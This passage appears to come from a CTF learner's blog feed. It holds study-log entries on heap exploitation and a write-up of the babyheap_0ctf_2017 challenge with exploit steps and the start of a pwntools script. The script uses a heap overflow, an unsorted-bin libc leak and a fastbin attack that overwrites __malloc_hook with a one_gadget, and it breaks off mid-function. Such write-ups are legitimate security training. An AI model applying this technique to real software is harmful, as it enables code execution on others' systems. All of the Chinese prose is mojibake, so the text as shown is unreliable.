<p>ç»“æœæ‰“äº†ä¸€å¤©çš„æ°´é¢˜ï¼ŒæŠŠbuuå‰å››é¡µçš„æ ˆé¢˜å’Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å…¨æ‰“äº†ï¼Œå †é¢˜ç•éš¾æƒ…ç»ªåˆ°è¾¾äº†ä¸€ä¸ªå·…å³°ï¼ˆ  </p>
<h2 id="2023-08-26"><a href="#2023-08-26" class="headerlink" title="2023/08/26"></a>2023/08/26</h2><p>è“å¸½æ¯ï¼åšäº†é“tcachebinçš„å †é¢˜ï¼Œè™½ç„¶æ˜¯èµ›åä¸€å°æ—¶è§£å‡ºæ¥çš„ï¼ˆ<br>è™½ç„¶ä½†æ˜¯ï¼Œè¿˜æ˜¯ä¸€ä¸Šæ¥å°±åšéš¾é¢˜å¹¶ä¸”æ˜¯åœ¨æ¯”èµ›ä¸­åšé¢˜ï¼Œå¸æ”¶çŸ¥è¯†å¿«ä¸€äº›ã€‚<br>å†™äº†ç¯‡wp,ä»Šå¤©å°±å…ˆåˆ°è¿™å§ã€‚</p>
<h2 id="2023-08-27"><a href="#2023-08-27" class="headerlink" title="2023/08/27"></a>2023/08/27</h2><p>å®åœ¨ä¸æƒ³åœ¨buuåˆ·äº†ï¼Œé¢˜ç›®éš¾åº¦ä¸å¤ªå‡è¡¡ï¼›æ‰€ä»¥å¼€äº†pwnableï¼Œä½†é¢˜åˆéš¾åˆå¤šâ€¦.<br>è¿˜æ˜¯å›buuå§ï¼Œåˆ«æ‰¾é‚£ä¹ˆå¤šç†ç”±ï¼Œè‡³å°‘å…ˆæŠŠå †çš„åŸç†æç†Ÿå†è¯´<br>å“ˆå“ˆ ç»“æœä»Šå¤©çœ‹äº†ä¸€å¤©çŒ«çŒ«æ•‘æ´è§†é¢‘ğŸ˜…<br>è°æ‡‚å•Šï¼ŒæŠŠæ•‘æ¥çš„çŒ«çŒ«èµ·ä¸ªå¥‡å¥‡æ€ªæ€ªçš„åå­—ç„¶åå¥½å¥½ç…§é¡¾å†æ‰¾ä¸ªå¥½ä¸€ç‚¹çš„é¢†å…»äººçœŸçš„å¾ˆé…·ï¼  </p>
<h2 id="2023-08-28"><a href="#2023-08-28" class="headerlink" title="2023/08/28"></a>2023/08/28</h2><p>åŸæ¥ä¸æƒ³å­¦ä¹ çš„çœŸæ­£åŸå› æ˜¯ddlå¤ªå¤š+æ²¡è¿åŠ¨<br>ä»Šå¤©ä¸­åˆèµ·åºŠæ¸…äº†ä¸€ä¸‹æ‚åŠ¡ddlï¼Œç„¶åå»æ‰“äº†å››å±€åŒæ‰“ï¼Œå›æ¥æ´—ä¸ªæ¾¡å°±æƒ³å­¦äº†ï¼ˆ<br>æŠŠæ˜¨å¤©çš„buuè¡¥ä¸Šï¼Œä»Šæ™šåšä¸¤é“é¢˜<br>è·Ÿlmarch2å¸ˆå‚…è®¨è®ºä»¥åï¼Œæˆ‘ä»¬ä¸€è‡´è®¤ä¸ºè¿›å…¥Heapé˜¶æ®µè¦è€ƒè™‘çš„ä¸œè¥¿æš´æ¶¨ã€‚<br>ä½†ä¸å…¶è¯´è¦è€ƒè™‘çš„ä¸œè¥¿å˜å¤šäº†ï¼Œä¸å¦‚è¯´èƒ½è€ƒè™‘çš„ç‚¹å˜å¤šäº†ã€‚<br>å¦‚æœæ€è·¯æ¸…æ™°äº†ï¼Œå…¶å®è¦è€ƒè™‘çš„ç‚¹ä¹Ÿå°±é‚£äº›<br>æ‰€ä»¥ä¸€ä¸ªæ€è·¯ç´¢å¼•è¡¨è¿˜æ˜¯æŒºé‡è¦çš„ï¼Œæ¯”å¦‚ï¼š  </p>
<ul>
<li>æ•´æ•°æº¢å‡º<ul>
<li>å¯æ”¹å†™BSSæ®µä»¥ä¸Šéƒ¨åˆ†<ul>
<li>èƒ½æ”¹æ ‡å‡†IO<ul>
<li>IO_FILEæ”»å‡»</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>æ ¼å¼åŒ–å­—ç¬¦ä¸²<ol>
<li>æ‰¾åç§»é‡</li>
</ol>
<ul>
<li>åœ¨æ ˆä¸Š</li>
<li>ä¸åœ¨æ ˆä¸Š<ul>
<li>æ‰¾æ¯”è¾ƒè¿‘çš„ä¸‰ä¸ªä¸²åœ¨ä¸€èµ·çš„åœ°å€</li>
</ul>
</li>
</ul>
</li>
<li>å †<ul>
<li>æ•æ„Ÿå‡½æ•°ï¼šè§‚å¯Ÿ<ul>
<li>è¯»<ul>
<li>printf</li>
<li>puts</li>
</ul>
</li>
<li>å†™<ul>
<li>gets</li>
<li>read</li>
</ul>
</li>
</ul>
</li>
<li>Libcç‰ˆæœ¬<ul>
<li>2.26ä»¥å‰<ul>
<li>fastbin attack</li>
</ul>
</li>
<li>2.26ä»¥å<ul>
<li>tcachebin attack</li>
</ul>
</li>
</ul>
</li>
<li>Leaked Address<ul>
<li>å †åœ°å€(tcache 2.31åŠä»¥ä¸‹çš„bk)</li>
<li>libcåœ°å€(unsortedbin leak; æ§åˆ¶heapList leak)</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>è¿˜æœ‰ä¸€ç‚¹ï¼ŒåšHeapé¢˜ä¸åƒStackä¸€æ ·å¯ä»¥æ•´ä½“åˆ†æå®Œä»¥åï¼Œç”¨æ’é™¤æ³•æ¥å†³å®šç”¨ä»€ä¹ˆæ‰“æ³•ï¼Œè€Œåº”è¯¥æ˜¯è¾¹æ‰“è¾¹åˆ†ææˆ‘ç¢°åˆ°äº†ä»€ä¹ˆæ•æ„Ÿå‡½æ•°ã€‚<br>å¤§å¤±è´¥..åšä¸ä¸‹å»ï¼ŒæŠŠä¸€é“é¢˜çš„æ€è·¯åˆ†æå¥½äº†å°±å› ä¸ºè§‰å¾—è‡ªå·±å·®ä¸å¤šèƒ½åšå‡ºæ¥äº†å°±ä¸æƒ³åšäº†ï¼Œkusoã€‚<br>æ€äº†ä¸ªå›é©¬æªï¼Œ23:00å†³å®šè¿˜æ˜¯ä»Šå¤©è¦åšå‡ºä¸€é“é¢˜æ¥ï¼Œäºæ˜¯æ‰“å¼€buuç¬¬ä¸‰é¡µå‡†å¤‡åšä¸€é“ã€‚<br>1hï¼Œå®Œå…¨åšä¸å‡ºæ¥ï¼ˆ<br>roarè¿™é“é¢˜æ˜¯off_by_one + fastbin attackå°±å¥½äº†ï¼Œæœ€ååŠ«æŒmalloc_hookä¸ºogä¸å¤ªè¡Œï¼Œç½‘ä¸Šè¯´è¦ç”¨reallocè°ƒæ•´æ ˆç¯å¢ƒï¼Œä½†è°ƒæ•´ä»¥åä¹Ÿä¸è¡Œâ€¦<br>å…ˆsleepå§ï¼Œæ˜å¤©å†æˆ˜ã€‚    </p>
<h2 id="2023-08-31"><a href="#2023-08-31" class="headerlink" title="2023/08/31"></a>2023/08/31</h2><p>çªç„¶å‘ç°ä¸¤å¤©æ²¡å†™logäº†ã€‚<br>29å·å¿˜äº†å¹²äº†å•¥äº†ï¼Œ30å·è¿”æ ¡ï¼Œä¸‹åˆæ”¶æ‹¾äº†ä¸€ä¸‹ç„¶åç»™æ–°ç”Ÿèµ›å‡ºé¢˜ã€‚<br>ä»Šå¤©ä¸ŠåˆæŠŠmoeçš„pwnakæ‰ï¼Œä¸‹åˆç»ƒå‰ä»–æ‰“çƒï¼Œæ™šä¸Šå¤ç›˜å¹¶æ•´åˆä¸€ä¸‹IOfileã€‚<br>å¥¥å¯¹ï¼Œä»Šå¤©è¿‡äº†NaNçš„å®¡æ ¸ï¼Œä»¥åå’±ä¹Ÿæ˜¯è”åˆæˆ˜é˜Ÿçš„ä¸€å‘˜å•¦XD<br>ä¸è¿‡â€¦N1å¸ˆå‚…ä»¬ç¡®å®å¤ªç‰›äº†ï¼Œæˆ‘æƒ³è¢«å½•åˆ°N1ç°åœ¨è¿˜æ˜¯å¤©æ–¹å¤œè°­â€¦<br>ç°åœ¨æ˜¯å¹»æƒ³æ—¶é—´ï¼š<br>ä¹æœˆä»½ç¬¬ä¸€ä¸ªå‘¨é€šå…³Heapï¼Œç¬¬äºŒä¸ªå‘¨å¤ç°ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„é¢˜æ¯”å¦‚WMçš„jitï¼Œç¬¬ä¸‰å‘¨ç¼“å†²ï¼Œç¬¬å››å‘¨æ¥è§¦Kernal.<br>é’ˆä¸æˆ³ï¼Œçœ‹çœ‹æˆ‘æœ‰æ²¡æœ‰èƒ½åŠ›å®ç°å§â€¦å»å¤ç›˜IOFILEäº†.  </p>
<h2 id="2023-09-04"><a href="#2023-09-04" class="headerlink" title="2023/09/04"></a>2023/09/04</h2><p>åˆå¥½ä¹…æ²¡è®°å½•logâ€¦è¿”æ ¡ä»¥åå¤ªå¿™äº†ï¼Œç¬¬ä¸€ä¸ªå‘¨å„ç§æ–‡ä»¶å„ç§å­¦ç”Ÿå·¥ä½œï¼Œé›¶ç¢æ—¶é—´éƒ½è¢«å ç”¨äº†ã€‚<br>ç¬¬ä¸€å‘¨é€šå…³Heapçš„æ¢¦æƒ³ç ´ç­äº†â€¦  </p>
<h2 id="2023-09-20"><a href="#2023-09-20" class="headerlink" title="2023/09/20"></a>2023/09/20</h2><p>å±…ç„¶ä¹æœˆäºŒåäº†ï¼Œè¿™ä¹Ÿå¤ªå¿«äº†ã€‚<br>ä»Šå¤©å¤§è‡´çœ‹äº†ä¸€ä¸‹kernal pwnçš„CVE-2022-0995ï¼Œå¯¹kernal pwnçš„ç¯å¢ƒæ­å»ºæœ‰äº†ä¸€ç‚¹å°è±¡ï¼Œä½†é‡Œé¢çš„å¤§éƒ¨åˆ†å†…å®¹æˆ‘éƒ½çœ‹ä¸æ‡‚ğŸ˜­ä¸è¿‡é‡Œé¢æåˆ°çš„å †å–·è®©æˆ‘æƒ³èµ·äº†è“å¸½æ¯åˆèµ›çš„heapSprayæˆ‘è¿˜æ²¡å¤ç°ã€‚<br>ç„¶åå¤ç°äº†ä¸€ä¸‹heapSprayï¼Œæ•´ä¸ªç¨‹åºé€†å‘èµ·æ¥è´¼å¤´ç–¼ï¼Œä»¥åè¦æ˜¯é€†èµ·æ¥å¾ˆéº»çƒ¦å°±patchï¼Œä¸€è¾¹è°ƒä¸€è¾¹çŒœä¸€è¾¹é€†ï¼Œä¸è¿‡æœ€åæ²¡å¤ç°å‡ºæ¥ï¼Œåªæ˜¯å¤§æ¦‚å¯¹å †å–·æœ‰äº†ä¸€ä¸ªåŸºæœ¬çš„è®¤çŸ¥ã€‚<br>ç„¶ååˆå»wikiä¸Šçœ‹ä¸€ä¸‹æ¥ä¸‹æ¥è¦å­¦å †çš„å“ªä¸€éƒ¨åˆ†ï¼Œç»“æœå‘ç°è‡ªå·±å“ªä¸€éƒ¨åˆ†éƒ½æœ‰çº°æ¼â€¦ä¸»è¦åŸå› è¿˜æ˜¯å¯¹ptmallocçš„ä¸€äº›æœºåˆ¶ä¸å¤Ÿç†Ÿæ‚‰ï¼Œæ¯”å¦‚unsortedbinä»€ä¹ˆæ—¶å€™å‰å‘åˆå¹¶ï¼Œæ¯”å¦‚unlinkçš„æ—¶å€™æ£€æŸ¥çš„æ˜¯fdå’Œbkçš„ä»€ä¹ˆç­‰ç­‰ã€‚<br>æ­£å¥½æƒ³åˆ°ä¹‹å‰çœ‹çš„winmtä¹Ÿå†™è¿‡heapå’Œioçš„ç¬”è®°ï¼Œé‚£æˆ‘ä¹Ÿæ¥æ¨¡ä»¿ä¸€ä¸‹å§ã€‚<br>ä¹‹å‰å¤ªè†¨èƒ€äº†ï¼Œç»™è‡ªå·±å®šäº†å¥½å¤šä¸åˆ‡å®é™…çš„ç›®æ ‡ã€‚<br>è¿™ä¸ªæœˆå‰©ä¸‹çš„åå¤©ï¼Œæ¯å¤©çš„pwnæ—¶é—´è‚¯å®šè¿˜æ˜¯è¦æ‰“ä¸€é“é¢˜çš„ï¼Œå¦‚æœæœ‰å¤šä½™çš„æ—¶é—´å°±æ¥æ•´ç†ä¸€ä¸‹å †çš„ç®¡ç†æœºåˆ¶ã€‚  </p>
]]></content>
      <categories>
        <category>LearningLog</category>
      </categories>
      <tags>
        <tag>LearningLog, Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF babyheap_0ctf_2017</title>
    <url>/2023/08/14/blog3/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
ç¬¬ä¸€é“Heapï¼Œæ’ä¸ªé‡Œç¨‹ç¢‘çºªå¿µä¸€ä¸‹XD
</blockquote>

<span id="more"></span>
<h1 id="0x00-å†™åœ¨å‰é¢"><a href="#0x00-å†™åœ¨å‰é¢" class="headerlink" title="0x00 å†™åœ¨å‰é¢"></a>0x00 å†™åœ¨å‰é¢</h1><p>ä¸ƒæœˆå­¦å®Œæ ˆæº¢å‡ºï¼Œakæ‰buuå‰ä¸¤é¡µçš„æ‰€æœ‰æ ˆé¢˜<br>å…«æœˆæœ¬æ¥æ˜¯æƒ³æŠŠå †å­¦ç©¿ï¼Œç­‰å›æƒ³èµ·è¿™ä¸ªç›®æ ‡å‰åŠä¸ªæœˆå·²ç»æ²¡äº†<br>å‚åŠ äº†ä¸ªæ•°æ®å®‰å…¨çš„å¤ä»¤è¥<br>ç»™sduçš„æ–°ç”Ÿèµ›æå®£ä¼ ï¼ˆæœ¬æ¥æƒ³å‡ºç‚¹ç­¾åˆ°é¢˜ç»“æœå·²ç»è¢«äººå‡ºå¥½äº†TT^TTï¼‰<br>ç»™SecretFlowå®¡äº†ä¸€ç‚¹goè¯­è¨€çš„æ´<br>ç„¶åç”¨C#å’Œxamlç»™sduæ ¡å›­ç½‘å†™äº†ä¸ªä¸€é”®ä¿®å¤è„šæœ¬<br>æ€»è€Œè¨€ä¹‹å­¦çš„å¾ˆæ‚â€¦è¯´å®è¯çœŸä¸å¦‚å¤šæ‰“ç‚¹æ¯”èµ›ã€‚<br>æœ¬æ¥æ ˆçš„èƒ½åŠ›å°±æ²¡å¾—åˆ°æ¯”èµ›çš„æ£€éªŒï¼Œå †çš„å­¦ä¹ æ—¶é—´åˆæ‰€å‰©æ— å‡ äº†â€¦<br>æ€»è€Œè¨€ä¹‹è¿˜æ˜¯è„šè¸å®åœ°å­¦ä¸€ç‚¹ç®—ä¸€ç‚¹å§<br>è¿˜æœ‰ä¸ªå—å¤§PAçš„å‘ç­‰ç€æˆ‘å»å¡«å‘¢â€¦æ‰åˆšæŠŠnemuçš„gdbå®ç°äº†ä¸ªå•æ­¥æ­¥å…¥â€¦  </p>
<hr>
<h1 id="0x01-babyheap-0ctf-2017"><a href="#0x01-babyheap-0ctf-2017" class="headerlink" title="0x01 babyheap_0ctf_2017"></a>0x01 babyheap_0ctf_2017</h1><blockquote>
<p>åšå®Œè¿™é“é¢˜æ‰ç®—çœŸæ­£æ„ä¹‰ä¸Šçš„AKç¬¬ä¸€é¡µXD</p>
<h3 id="â… -ä¸»è¦çŸ¥è¯†ç‚¹"><a href="#â… -ä¸»è¦çŸ¥è¯†ç‚¹" class="headerlink" title="â… . ä¸»è¦çŸ¥è¯†ç‚¹"></a>â… . ä¸»è¦çŸ¥è¯†ç‚¹</h3><ol>
<li>å †æº¢å‡º</li>
</ol>
</blockquote>
<h3 id="â…¡-è§£é¢˜æ­¥éª¤"><a href="#â…¡-è§£é¢˜æ­¥éª¤" class="headerlink" title="â…¡. è§£é¢˜æ­¥éª¤"></a>â…¡. è§£é¢˜æ­¥éª¤</h3><ol>
<li><p>checksec ä¿æŠ¤å…¨å¼€<br><img src="/pic/Pasted image 20230814133847.png" alt=""></p>
</li>
<li><p>è¯¥elfæ–‡ä»¶åœ¨ubuntu16ä¸­åˆ›å»ºï¼Œwslç”¨çš„æœ¬æœºlibcè‚¯å®šä¸åˆé€‚ï¼Œæ‰€ä»¥<code>patchelf</code>ä¸€ä¸‹  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ‹–è¿›IDA64åˆ†æï¼Œè®©åæ±‡ç¼–ä»¥åçš„ä»£ç å¥½çœ‹ä¸€ç‚¹<br><img src="/pic/Pasted image 20230814134313.png" alt=""><br><img src="/pic/Pasted image 20230814134623.png" alt=""><br>æ³¨ï¼šIDAä¸­å¿«æ·é”®yå¯ä»¥ä¿®æ”¹å˜é‡ç±»å‹ï¼Œä¸Šå›¾Allocå‡½æ•°çš„æˆ‘å°†a1çš„å˜é‡ç±»å‹<code>_int64</code>ä¿®æ”¹ä¸º<code>_int64*</code></p>
</li>
<li><p>IDAåˆ†æå¯çŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥æœ‰ä»¥ä¸‹æ€è·¯ï¼š</p>
<ol>
<li>Fillå‡½æ•°çš„è¾“å…¥å­—ç¬¦æ•°é‡æ˜¯å—æˆ‘ä»¬æ§åˆ¶çš„ï¼Œæ‰€ä»¥å¯ä»¥å †æº¢å‡ºï¼›</li>
<li>ç”±äºæœ¬é¢˜å¹¶æ²¡æœ‰ç»™å‡ºsystemç­‰å¯ä»¥ç›´æ¥ææƒçš„å‡½æ•°ï¼Œæ‰€ä»¥è€ƒè™‘æ³„éœ²libcåœ°å€<ol>
<li>è¦æ³„éœ²libcåœ°å€ï¼Œè‚¯å®šè¦è¯»å­˜æœ‰libcåœ°å€çš„åœ°å€<ol>
<li>å“ªé‡Œå­˜ç€libcåœ°å€ï¼Ÿunsorted binä»…æœ‰ä¸€ä¸ªchunkæ—¶ï¼Œæ­¤chunkçš„fdå’Œbkéƒ½æŒ‡å‘<code>åœ°å€main_arena+58</code>ï¼Œè€Œmain_arenaæ˜¯libcçš„dataæ®µä¸­çš„ä¸€ä¸ªå…¨å±€é™æ€å˜é‡ï¼Œæ‰€ä»¥æ³„éœ²å®ƒå°±å¯ä»¥çŸ¥é“libc_baseï¼ˆæ³¨ï¼šæ­¤å¤„å­˜æ”¾çš„æ˜¯topchunkçš„åœ°å€ï¼‰</li>
<li>æ€ä¹ˆå»è¯»unsorted binçš„fd/bkæŒ‡é’ˆï¼Ÿå †æº¢å‡º+å¤šæ¬¡free/alloc</li>
</ol>
</li>
</ol>
</li>
<li>æœ‰äº†libcåœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹fastbinçš„fdæŒ‡é’ˆï¼Œåœ¨ç¨‹åºçš„__malloc_hookå¤„(ç”¨libc+åç§»æ¥è®¡ç®—)ç”³è¯·ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥æ“æ§çš„å †å—ï¼Œå¹¶åœ¨å…¶ä¸­å†™å…¥ogçš„åœ°å€æ¥ææƒ</li>
</ol>
</li>
<li><p>å¤§æ¦‚æ€è·¯æˆ‘ä»¬æœ‰äº†ï¼Œæ¥ä¸‹æ¥æ˜¯å†™exp+è°ƒè¯•éªŒè¯æ€è·¯ã€‚æˆ‘ä»¬ä¸ºäº†èƒ½å¤Ÿå°†chunkæ”¾å…¥unsorted binï¼Œè‚¯å®šéœ€è¦ä¸€ä¸ªsmall chunkï¼›è¦fastbin attackï¼Œè‚¯å®šéœ€è¦ä¸¤ä¸ªfastbin chunkï¼›ä¸ºäº†æ–¹ä¾¿æ§åˆ¶è¿™ä¸‰ä¸ªchunkï¼Œæˆ‘ä»¬å†è®¾ç½®ä¸¤ä¸ªfastbin chunkï¼Œå³ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x10) #index = 0</span><br><span class="line">alloc(0x10) #index = 1</span><br><span class="line">alloc(0x10) #index = 2</span><br><span class="line">alloc(0x10) #index = 3</span><br><span class="line">alloc(0x80) #index = 4</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶å †çš„æƒ…å†µå¦‚ä¸‹<br><img src="/pic/Pasted image 20230814140742.png" alt=""></p>
</li>
<li><p>Freeæ‰indexä¸º1å’Œ2çš„chunkï¼Œç»™åé¢allocç•™å‡ºç©ºé—´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(1)</span><br><span class="line">free(2)</span><br></pre></td></tr></table></figure>
<p>heapæƒ…å†µå¦‚ä¸‹<br><img src="/pic/Pasted image 20230814141436.png" alt=""><br>binæƒ…å†µå¦‚ä¸‹<br><img src="/pic/Pasted image 20230814141724.png" alt=""></p>
</li>
<li><p>å †æº¢å‡ºï¼Œæ“æ§fastbin</p>
<ol>
<li>ç°åœ¨æ˜¯main_arena_fastbin_0x20 â€”-&gt; chunk2 â€”-&gt;chunk1</li>
<li>æˆ‘ä»¬æƒ³åŠæ³•è®©å®ƒå˜æˆ xxx_0x20 â€”-&gt; chunk2 â€”-&gt;chunk4<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = (p64(0)*3 +p64(0x21))*2 + p8(0x80)</span><br><span class="line">fill(0,payload)</span><br></pre></td></tr></table></figure>
ï¼ˆè¿™é‡Œè¯»è€…å¯ä»¥è‡ªå·±gdb.attachç”¨binå‘½ä»¤å»æŸ¥çœ‹fastbinå‰åçš„çŠ¶æ€ï¼‰</li>
</ol>
</li>
<li><p>ç”±äºä»fastbinç”³è¯·chunkæ—¶ä¼šæ£€æŸ¥fastbinä¸­chunkçš„sizeï¼Œå¦‚æœä¸åŒ¹é…åˆ™æŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡å †æº¢å‡ºä¿®æ”¹chunk4çš„sizeï¼Œè®©å…¶ä»0x91å˜ä¸º0x21</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç”³è¯·ä¸¤ä¸ªå¤§å°ä¸º0x10çš„chunkï¼Œå¯ä»¥çœ‹åˆ°<code>åŸchunk1</code>æŒ‡å‘äº†<code>åŸchunk2çš„åœ°å€</code>ï¼Œ<code>åŸchunk2</code>æŒ‡å‘äº†<code>åŸchunk4çš„åœ°å€</code>ï¼Œè¿™æ ·æˆ‘ä»¬å°±æœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘chunk4äº†ï¼Œå¯ä»¥ç”¨ä¸€ä¸ªæŒ‡é’ˆæ¥é‡Šæ”¾ï¼Œä¸€ä¸ªæŒ‡é’ˆæ¥è¯»å–ï¼Œæ–¹ä¾¿é˜…è¯»æˆ‘ä»¬åˆ†åˆ«å‘½åä¸ºpointer_chunk4å’Œpointer_chunk2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br></pre></td></tr></table></figure>
<p>heapæƒ…å†µå¦‚ä¸‹<br><img src="/pic/Pasted image 20230814143302.png" alt=""></p>
</li>
<li><p>ç›´æ¥ç”¨pointer_chunk4é‡Šæ”¾chunk4ï¼Œptmallocä¼šå› ä¸ºæ‰¾ä¸åˆ°topchunkè€ŒæŠ¥é”™ã€‚æ‰€ä»¥æˆ‘ä»¬åº”è¯¥æ¢å¤chunk4çš„sizeåˆ°0x91å†freeï¼Œä½†è¿™æ ·ä¼šå¯¼è‡´chunk4ç›´æ¥è·Ÿtopchunkåˆå¹¶ã€‚æ‰€ä»¥æˆ‘ä»¬è¦å…ˆæ¢å¤chunk4çš„sizeåˆ°0x91å†ç”³è¯·ä¸€ä¸ª0x80å¤§å°çš„å †å—éš”ç¦»topchunkå†free</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">alloc(0x80)</span><br><span class="line">free(4)</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ­¤æ—¶chunk4çš„fdå’Œbkå°±å·²ç»å­˜æ”¾ç€ä¸€ä¸ªåœ°å€äº†ï¼Œæˆ‘ä»¬é€šè¿‡pointer_chunk2æ¥æŠŠä»–è¯»å‡ºæ¥ã€‚è¿™ä¸ªåœ°å€æ˜¯main_arena+88ï¼Œæ‰“å¼€libcå¯ä»¥çœ‹åˆ°main_arenaçš„åœ°å€ä¸º0x3c4b20ï¼Œæ‰€ä»¥æˆ‘ä»¬è·å¾—çš„libc_addréœ€è¦å‡88å†å‡0x3c4b20ï¼Œå³å‡å»0x3C4B78<br><img src="/pic/Pasted image 20230814144704.png" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base Â  ---&gt; Â  &quot;,hex(libc_base))</span><br></pre></td></tr></table></figure>
</li>
<li><p>æˆ‘ä»¬ç°åœ¨æœ‰äº†libcçš„åœ°å€ï¼Œä¸‹ä¸€æ­¥æ˜¯åŠ«æŒmalloc_hookã€‚ç”±äºæˆ‘ä»¬è¦é€šè¿‡fastbinæ¥åœ¨malloc_hookå¤„ç”³è¯·å †å—ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡fastbinå¯¹äºsizeçš„æ£€éªŒï¼Œæ‰€ä»¥çœ‹ä¸€ä¸‹malloc_hookå‰é¢æœ‰æ²¡æœ‰æˆ‘ä»¬èƒ½å¤Ÿç”³è¯·å †å—çš„åœ°æ–¹<br><img src="/pic/Pasted image 20230814145721.png" alt=""><br>å‘ç°aedå¤„çš„0x0000007fç¬¦åˆfastbinçš„ç©ºé—´ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨libc_base+0x3c4aed(è¿™ä¸ªç”¨å½“å‰åœ°å€å‡å»åŸºåœ°å€å³å¯ç®—å‡º)æ¥ç”³è¯·<br>âš è¿™é‡Œå›¾aedå†™é”™äº†ï¼Œè€Œä¸”ä¸åº”è¯¥çœ‹è¿™ä¸ªç•Œé¢ï¼Œæ•´ä½“ä¸Šçš„chunkåº”è¯¥æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aed  0x----------------(prev_size) 0x000000000000007f(size)</span><br><span class="line">afd  ---------------------user_data-----------------------</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x60)                                    # å°†unsortedbinä¸­çš„chunk4åˆ‡0x60å¤§å°ç”³è¯·å‡ºæ¥</span><br><span class="line">free(4)                                        # æŠŠchunk4æ”¾åˆ°fastbinä¸­ï¼Œä¾¿äºç”¨pointer_chunk2æ“æ§</span><br><span class="line">payload = p64(libc_base+0x3c4aed)              # æŠŠç”³è¯·å—å†™è¿›malloc_hookå‰é¢</span><br><span class="line">fill(2,payload)                                # è¿™ä¸€æ­¥åï¼Œfastbin: main_arena ---&gt; chunk4 ---&gt; _ + 0x3c4aed</span><br><span class="line">alloc(0x60)                                    # æŠŠchunk4ç”³è¯·å›æ¥</span><br><span class="line">alloc(0x60)                                    # åœ¨malloc_hookå¤„æ„é€ å †ï¼Œindex=6</span><br></pre></td></tr></table></figure>
<ol>
<li><p>æˆ‘ä»¬ä¿®æ”¹chunk6çš„å†…å®¹ï¼Œå³ä¿®æ”¹malloc_hookï¼Œæˆ‘ä»¬ç”¨ogæ¥ææƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*19 + p64(libc_base + 0x4526a)</span><br><span class="line">fill(6,payload)</span><br></pre></td></tr></table></figure>
</li>
<li><p>è‹¥malloc_hookä¸ä¸ºç©ºï¼Œå†ç”³è¯·å †æ—¶ä¼šå…ˆè°ƒç”¨malloc_hookå¤„çš„å‡½æ•°ï¼Œæ‰€ä»¥éšä¾¿ç”³è¯·å³å¯cat flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(255)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="â…¢-å®Œæ•´EXP"><a href="#â…¢-å®Œæ•´EXP" class="headerlink" title="â…¢. å®Œæ•´EXP"></a>â…¢. å®Œæ•´EXP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 25970</span><br><span class="line">file = &#x27;./babyheap_0ctf_2017&#x27;</span><br><span class="line">  </span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"># gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">  </span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size):</span><br><span class="line">Â  Â  io.sendlineafter(&#x27;Command: &#x27;, str(1))</span><br><span class="line">Â  Â  io.sendlineafter(&#x27;Size: &#x27;, str(size))</span><br><span class="line">  </span><br><span class="line">def fill(index, content):</span><br><span class="line">Â  Â  io.sendlineafter(&#x27;Command: &#x27;, str(2))</span><br><span class="line">Â  Â  io.sendlineafter(&#x27;Index: &#x27;, str(index))</span><br><span class="line">Â  Â  io.sendlineafter(&#x27;Size: &#x27;, str(len(content)))</span><br><span class="line">Â  Â  io.sendlineafter(&#x27;Content: &#x27;,content)</span><br><span class="line">  </span><br><span class="line">def free(index):</span><br><span class="line">Â  Â  io.sendlineafter(&#x27;Command: &#x27;, str(3))</span><br><span class="line">Â  Â  io.sendlineafter(&#x27;Index: &#x27;,str(index))</span><br><span class="line">  </span><br><span class="line">def dump(index):</span><br><span class="line">Â  Â  io.sendlineafter(&#x27;Command: &#x27;, 